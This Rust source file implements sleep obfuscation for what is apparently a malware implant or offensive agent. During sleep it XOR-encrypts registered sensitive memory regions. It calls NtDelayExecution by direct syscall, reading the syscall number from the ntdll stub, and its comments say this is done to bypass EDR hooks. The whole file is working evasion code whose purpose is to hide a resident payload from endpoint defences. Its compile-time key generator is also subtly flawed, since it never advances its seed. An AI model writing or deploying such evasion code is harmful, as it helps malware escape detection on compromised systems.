//! Sleep Obfuscation: isolated thread with JIT encryption of sensitive data.
//!
//! Instead of encrypting the entire .text section (which would crash the
//! calling thread), we:
//! 1. Register sensitive memory regions (configs, keys, buffers)
//! 2. Spawn a dedicated background thread
//! 3. The background thread XOR-encrypts registered regions, sleeps via
//!    direct syscall (bypassing EDR hooks), then decrypts on wake
//! 4. The calling thread blocks until the sleep completes
//!
//! This is safe because:
//! - We never encrypt executable code (no .text modification)
//! - The background thread owns all encryption state
//! - Sensitive data is unreadable during the sleep window

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

/// A registered memory region containing sensitive data.
struct SensitiveRegion {
    addr: *mut u8,
    len: usize,
}

// SAFETY: SensitiveRegion is only accessed from the obfuscation thread
// while the main thread is blocked waiting.
unsafe impl Send for SensitiveRegion {}
unsafe impl Sync for SensitiveRegion {}

static REGISTERED_REGIONS: Mutex<Vec<SensitiveRegion>> = Mutex::new(Vec::new());
static KEY: [u8; 64] = generate_key_const();

/// Register a memory region for sleep-time encryption.
///
/// # Safety
/// The region must remain valid until `obfuscated_sleep` returns.
pub unsafe fn register_region(addr: *mut u8, len: usize) {
    if let Ok(mut regions) = REGISTERED_REGIONS.lock() {
        regions.push(SensitiveRegion { addr, len });
    }
}

/// Sleep with sensitive data obfuscation.
/// Registered memory regions are XOR-encrypted during the sleep window.
/// Falls back to direct syscall sleep if encryption setup fails.
pub fn obfuscated_sleep(duration: Duration) {
    let regions = match REGISTERED_REGIONS.lock() {
        Ok(mut r) => std::mem::take(&mut *r),
        Err(_) => {
            direct_syscall_sleep(duration);
            return;
        }
    };

    if regions.is_empty() {
        // No sensitive regions registered, just sleep
        direct_syscall_sleep(duration);
        return;
    }

    let done = Arc::new(AtomicBool::new(false));
    let done_clone = done.clone();

    // Spawn isolated background thread for encrypt→sleep→decrypt
    let handle = std::thread::spawn(move || {
        // Phase 1: Encrypt all registered regions
        for region in &regions {
            unsafe {
                xor_crypt(region.addr, region.len, &KEY);
            }
        }

        // Phase 2: Sleep via direct syscall (bypasses EDR hooks)
        direct_syscall_sleep(duration);

        // Phase 3: Decrypt all registered regions
        for region in &regions {
            unsafe {
                xor_crypt(region.addr, region.len, &KEY);
            }
        }

        done_clone.store(true, Ordering::Release);
    });

    // Main thread also sleeps (normal sleep, no obfuscation needed for main thread)
    // but shorter than the background thread to ensure we're ready when it finishes
    let main_sleep = duration.saturating_sub(Duration::from_millis(100));
    if !main_sleep.is_zero() {
        std::thread::sleep(main_sleep);
    }

    // Spin-wait for the background thread to finish decrypting
    while !done.load(Ordering::Acquire) {
        std::hint::spin_loop();
    }

    let _ = handle.join();
}

/// XOR-encrypt/decrypt a region in place.
#[inline]
unsafe fn xor_crypt(data: *mut u8, len: usize, key: &[u8]) {
    let key_len = key.len();
    for i in 0..len {
        *data.add(i) ^= key[i % key_len];
    }
}

/// Generate a compile-time random XOR key using const fn tricks.
const fn generate_key_const() -> [u8; 64] {
    // Seed from compile-time constants (file hash, line, etc.)
    let mut key = [0u8; 64];
    let seed: u64 = 0x4B756E7A_656C6C65; // "Kunzelle" in hex — arbitrary constant
    let mut i = 0;
    while i < 64 {
        // Simple LCG-like PRNG
        let v = seed.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        key[i] = (v >> ((i % 8) * 8)) as u8 ^ (i as u8).wrapping_mul(0x9E) ^ 0x37;
        i += 1;
    }
    key
}

// ── Direct Syscall: NtDelayExecution ─────────────────────────────────
//
// Resolves syscall number dynamically from ntdll stub.
// Bypasses EDR hooks on kernel32!Sleep and ntdll!NtDelayExecution.

fn direct_syscall_sleep(duration: Duration) {
    #[cfg(target_os = "windows")]
    {
        windows_direct_sleep(duration);
    }
    #[cfg(not(target_os = "windows"))]
    {
        std::thread::sleep(duration);
    }
}

#[cfg(target_os = "windows")]
fn windows_direct_sleep(duration: Duration) {
    unsafe {
        extern "system" {
            fn LoadLibraryA(lpFileName: *const u8) -> *mut u8;
            fn GetProcAddress(hModule: *mut u8, lpProcName: *const u8) -> *mut u8;
        }

        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
        if ntdll.is_null() {
            std::thread::sleep(duration);
            return;
        }

        let nt_delay_addr = GetProcAddress(ntdll, b"NtDelayExecution\0".as_ptr());
        if nt_delay_addr.is_null() {
            std::thread::sleep(duration);
            return;
        }

        // Parse syscall number from stub: mov r10, rcx (4C 8B D1) | mov eax, SSN (B8 XX XX 00 00) | syscall
        let stub = std::slice::from_raw_parts(nt_delay_addr, 8);
        if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8 {
            let ssn = u32::from_le_bytes([stub[4], stub[5], stub[6], stub[7]]);

            // LARGE_INTEGER: negative = relative delay in 100ns units
            let hundred_ns = (duration.as_nanos() / 100) as i64;
            let large_int: i64 = -(hundred_ns as i64);

            let mut status: i64;
            std::arch::asm!(
                "mov r10, rcx",
                "syscall",
                in("rax") ssn as u64,
                in("rcx") 0usize, // Alertable = FALSE
                in("rdx") &large_int as *const i64,
                lateout("rax") status,
                out("r10") _,
                out("r11") _,
            );
            let _ = status;
        } else {
            std::thread::sleep(duration);
        }
    }
}
